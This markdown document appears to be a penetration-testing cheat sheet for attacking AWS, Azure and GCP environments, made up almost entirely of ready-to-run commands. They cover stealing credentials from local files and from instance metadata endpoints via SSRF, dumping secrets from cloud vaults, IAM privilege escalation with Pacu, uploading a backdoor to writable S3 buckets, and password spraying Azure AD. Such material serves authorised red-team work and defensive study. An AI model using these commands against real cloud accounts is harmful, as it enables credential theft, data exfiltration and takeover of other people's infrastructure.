# Cloud Attacks — Deep Dive

> Methodology for attacking AWS, Azure, and GCP environments.
> Maps to multiple MITRE ATT&CK Cloud Matrix techniques.

---

## AWS Attacks

### Initial Access — Credential Discovery
```bash
# Check for leaked AWS keys
# Environment variables
env | grep -i aws
cat ~/.aws/credentials
cat ~/.aws/config

# EC2 metadata (SSRF → cloud compromise)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# IMDSv2 (token required):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data (may contain secrets)
curl http://169.254.169.254/latest/user-data

# Check for keys in common locations
grep -rn "AKIA" /var/www/ /home/ /opt/ 2>/dev/null  # AWS Access Key IDs start with AKIA
find / -name ".env" -exec grep -l "AWS" {} \; 2>/dev/null
```

### Enumeration with AWS CLI
```bash
# Configure stolen credentials
aws configure
# Or export:
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."  # If temporary creds

# Who am I?
aws sts get-caller-identity

# Enumerate permissions (what can I do?)
# Use enumerate-iam tool:
# python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET

# S3 buckets
aws s3 ls
aws s3 ls s3://BUCKET_NAME --recursive
aws s3 cp s3://BUCKET_NAME/sensitive-file ./

# EC2 instances
aws ec2 describe-instances --output table
aws ec2 describe-security-groups

# IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies
aws iam get-user --user-name USERNAME
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME

# Lambda functions (may contain secrets)
aws lambda list-functions
aws lambda get-function --function-name FUNC_NAME

# Secrets Manager / Parameter Store
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# RDS databases
aws rds describe-db-instances
```

### Privilege Escalation in AWS
```bash
# Common paths (check with Pacu or manually):
# 1. iam:CreatePolicy + iam:AttachUserPolicy → give yourself admin
# 2. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction → execute as role
# 3. iam:PassRole + ec2:RunInstances → launch EC2 with admin role
# 4. sts:AssumeRole → assume a more privileged role
# 5. lambda:UpdateFunctionCode → modify existing function

# Pacu (AWS exploitation framework)
# pip install pacu
pacu
> import_keys
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__escalate_privileges
```

### S3 Bucket Attacks
```bash
# Find public buckets
aws s3 ls s3://TARGET-BUCKET --no-sign-request  # Anonymous access
aws s3 cp s3://TARGET-BUCKET/file ./ --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket BUCKET_NAME
aws s3api get-bucket-acl --bucket BUCKET_NAME

# Upload to writable bucket (deface/backdoor)
aws s3 cp backdoor.html s3://TARGET-BUCKET/index.html --no-sign-request
```

---

## Azure Attacks

### Initial Access
```bash
# Azure metadata service (SSRF)
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure CLI credentials
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# Service principal credentials
find / -name "*.publishsettings" 2>/dev/null
grep -rn "client_secret\|ClientSecret\|AZURE_" /var/www/ /home/ /opt/ 2>/dev/null
```

### Enumeration
```bash
# Azure CLI
az login  # Interactive login or with --service-principal
az account list
az account show

# Resource enumeration
az resource list --output table
az vm list --output table
az webapp list --output table
az storage account list --output table
az keyvault list --output table

# AAD enumeration
az ad user list --output table
az ad group list --output table
az ad sp list --output table
az role assignment list --output table

# Key Vault (secrets!)
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
```

### Azure AD Attacks
```bash
# Password spray against Azure AD
# Use tools like MSOLSpray, o365spray, or trevorspray
# python3 o365spray.py --spray -U users.txt -p 'Password123!' -d TARGET.onmicrosoft.com

# Token theft
# Steal JWT tokens from browser, Azure CLI cache, or SSRF to metadata
# Decode: jwt.io or jwt_tool

# Managed Identity exploitation
# If you have code execution on an Azure VM/Function with managed identity:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Use the token to call Azure APIs
```

---

## GCP Attacks

### Initial Access
```bash
# GCP metadata (SSRF)
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id

# Service account keys
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null
cat /path/to/service-account-key.json

# Application default credentials
cat ~/.config/gcloud/application_default_credentials.json
```

### Enumeration
```bash
# Authenticate
gcloud auth activate-service-account --key-file=key.json
gcloud auth login  # Interactive

# Project info
gcloud projects list
gcloud config set project PROJECT_ID

# Compute instances
gcloud compute instances list
gcloud compute firewall-rules list

# Storage
gsutil ls
gsutil ls gs://BUCKET_NAME
gsutil cp gs://BUCKET_NAME/file ./

# IAM
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET_NAME

# Cloud Functions
gcloud functions list
gcloud functions describe FUNCTION_NAME
```

---

## Cross-Cloud: Common Attack Patterns

```
SSRF on cloud instance     → Hit metadata endpoint → Steal IAM/managed identity token
                            → Use token to enumerate and escalate

Leaked credentials         → Enumerate permissions → Find priv esc path
                            → Access secrets/storage → Lateral movement

Overprivileged function    → Modify code → Execute as function's identity
                            → Access other cloud resources

Public storage             → Download sensitive data → Upload backdoor (if writable)

Key/Secret in source code  → Use to authenticate → Enumerate what it can access
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Pacu | AWS exploitation framework |
| ScoutSuite | Multi-cloud security auditing |
| Prowler | AWS security assessment |
| enumerate-iam | AWS permission enumeration |
| o365spray | Azure AD password spraying |
| ROADtools | Azure AD exploration |
| GCPBucketBrute | GCP bucket enumeration |
| CloudBrute | Multi-cloud enumeration |
